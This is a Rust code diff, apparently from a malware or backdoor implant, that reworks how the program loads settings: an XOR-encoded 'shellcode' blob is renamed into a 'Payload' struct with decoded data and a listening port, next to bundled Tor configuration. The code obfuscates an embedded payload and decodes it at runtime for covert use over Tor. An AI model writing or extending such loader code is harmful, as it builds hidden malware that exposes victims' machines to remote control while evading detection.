@@ -9,8 +9,12 @@ pub struct Setting {
     pub name: String,
     pub tor_dir: PathBuf,
     pub torrc: String,
-    pub shellcode: Vec<u8>,
-    pub uses_shellcode: bool
+    pub uses_payload: bool,
+}
+
+pub struct Payload {
+    pub lport: u16,
+    pub data: Vec<u8>
 }
 
 impl Setting {
@@ -39,26 +43,31 @@ pub fn load_settings() -> Result<Setting, Box<dyn error::Error>> {
         &String::from(config::ENC_TORRC)
     )?;
 
-    let uses_shellcode = config::ENC_SHELLCODE != "";
-    let shellcode = if uses_shellcode {
-        xor::decode_bytes(
-            &key,
-            &String::from(config::ENC_SHELLCODE)
-        )?
-    } else {
-        Vec::new()
-    };
+    let uses_payload = config::ENC_PAYLOAD_DATA != "";
 
     let setting = Setting {
         name,
         key,
         torrc,
         tor_dir: expand_user_dir(&tor_dir),
-        shellcode,
-        uses_shellcode,
+        uses_payload,
     };
 
     Ok(setting)
+}
+
+pub fn get_payload(setting: &Setting) -> Result<Payload, Box<dyn error::Error>> {
+    let data = xor::decode_bytes(
+        &setting.key,
+        &String::from(config::ENC_PAYLOAD_DATA)
+    )?;
+
+    let lport = config::PAYLOAD_PORT.parse::<u16>()?;
+
+    Ok(Payload {
+        lport,
+        data,
+    })
 }
 
 fn unbundle_tor(setting: &Setting) -> Result<(), Box<dyn error::Error>> {
